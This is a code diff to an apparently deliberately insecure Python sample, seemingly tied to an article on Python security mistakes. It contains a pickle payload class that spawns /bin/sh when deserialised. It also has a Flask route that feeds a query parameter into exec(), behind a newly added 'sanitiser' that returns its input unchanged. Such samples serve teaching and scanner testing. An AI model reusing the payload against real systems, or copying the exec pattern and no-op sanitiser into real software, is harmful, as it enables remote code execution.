@@ -3,6 +3,7 @@
 # s-in-python-and-how-to-avoid-them-e19fbe265e03
 import subprocess
 import base64
+from turtle import st
 import cPickle
 
 
@@ -27,12 +28,16 @@ class RunBinSh(object):
         return (subprocess.Popen, (('/bin/sh',),))
 
 def import_urlib_version(version):
-    exec("import urllib%s as urllib" % version)
+    ver = dummy_sanitizer(version)
+    exec("import urllib%s as urllib" % ver)
 
 @app.route('/')
 def index():
     module = flask.request.args.get("module")
     import_urlib_version(module)
 
+
+def dummy_sanitizer(string):
+    return string
 
 print(base64.b64encode(pickle.dumps(RunBinSh())))
